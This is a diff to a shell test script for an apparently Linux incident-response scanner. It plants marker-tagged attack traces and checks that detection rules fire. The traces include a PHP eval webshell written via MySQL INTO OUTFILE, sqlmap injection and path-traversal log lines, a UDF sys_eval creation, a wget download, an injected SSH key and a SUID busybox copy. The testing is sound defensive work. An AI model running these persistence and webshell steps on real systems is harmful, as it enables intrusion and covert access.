@@ -23,6 +23,8 @@ no_rule LNX.PERSIST.PROFILE.001
 no_rule LNX.TRACE.HISTORY.001
 no_rule LNX.SUID.UNEXPECTED.001
 no_rule LNX.PERSIST.SYSTEMD.001
+no_rule LNX.PERSIST.SSHLOG.001
+no_rule LNX.WEB.LOGATTACK.001
 # 注：容器 /etc/hosts 含 docker 注入的主机名行，HOSTS.MAP 属预期命中，不做负例断言
 
 echo "=== 阶段2：正例夹具（全部 ctfir-marker 前缀）==="
@@ -37,6 +39,14 @@ echo 'wget http://127.0.0.1/ctfir-marker.sh -O /tmp/ctfir-marker-evil.sh' > /roo
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarkerctfirmarker ctfir-marker@test' > /root/.ssh/authorized_keys
 cp /bin/busybox /usr/bin/ctfir-marker-suid 2>/dev/null && chmod 4755 /usr/bin/ctfir-marker-suid
 printf '[Service]\nExecStart=/tmp/ctfir-marker-evil.sh\n' > /etc/systemd/system/ctfir-marker.service
+# v0.6: SSHLOG + 宝塔日志攻击特征
+printf 'ctfir-marker : (redacted)\n' > /tmp/.sshlog
+mkdir -p /www/wwwlogs /var/log/mysql /var/lib/mysql
+i=0; while [ $i -lt 60 ]; do echo '10.88.88.88 - - [12/Nov/2026:10:00:00 +0800] "POST /ctfir-marker.php HTTP/1.1" 200 -' >> /www/wwwlogs/ctfir-marker.com.log; i=$((i+1)); done
+echo '10.88.88.88 - - [12/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%20SELECT%201,2,3 HTTP/1.1" 200 12 "-" "sqlmap/1.7"' >> /www/wwwlogs/ctfir-marker.com.log
+echo '10.88.88.88 - - [12/Nov/2026:10:02:00 +0800] "GET /static/../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0"' >> /www/wwwlogs/ctfir-marker.com.log
+printf '# Time: 2026-11-12\nSELECT "<?php eval(\$_POST[1]);?>" INTO OUTFILE "/var/www/html/ctfir-marker-slow.php";\n' > /var/log/mysql/mysql-slow.log
+printf 'Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n' > /var/lib/mysql/mysql-bin.000001
 
 rm -rf "$OUT"
 "$BIN" scan --out "$OUT" > /dev/null 2>&1
@@ -50,6 +60,11 @@ has_rule LNX.TRACE.HISTORY.001
 has_rule LNX.SSH.AUTHKEY.001
 has_rule LNX.SUID.UNEXPECTED.001
 has_rule LNX.PERSIST.SYSTEMD.001
+has_rule LNX.PERSIST.SSHLOG.001
+has_rule LNX.WEB.LOGPOST.001
+has_rule LNX.WEB.LOGATTACK.001
+has_rule MID.MYSQL.SLOWLOG.001
+has_rule MID.MYSQL.BINLOG.001
 has_text ctfir-marker.local findings.json
 # HTML 报告产物 + 无脚本外链
 [ -f "$OUT/report.html" ] && ok "report.html exists" || bad "report.html missing"
@@ -57,7 +72,10 @@ grep -qi "http://\|https://" "$OUT/report.html" && bad "html has external URL" |
 
 echo "=== 阶段3：清理并复验 ==="
 rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh \
-      /etc/systemd/system/ctfir-marker.service /usr/bin/ctfir-marker-suid
+      /etc/systemd/system/ctfir-marker.service /usr/bin/ctfir-marker-suid \
+      /tmp/.sshlog /www/wwwlogs/ctfir-marker.com.log \
+      /var/log/mysql/mysql-slow.log /var/lib/mysql/mysql-bin.000001
+rmdir /www/wwwlogs /www /var/log/mysql 2>/dev/null || true
 rm -f /etc/ld.so.preload
 # /etc/hosts 是 docker bind-mount（rename 会 EBUSY）→ 用覆写而非 sed -i
 grep -v ctfir-marker /etc/hosts > /tmp/hosts.clean 2>/dev/null && cat /tmp/hosts.clean > /etc/hosts
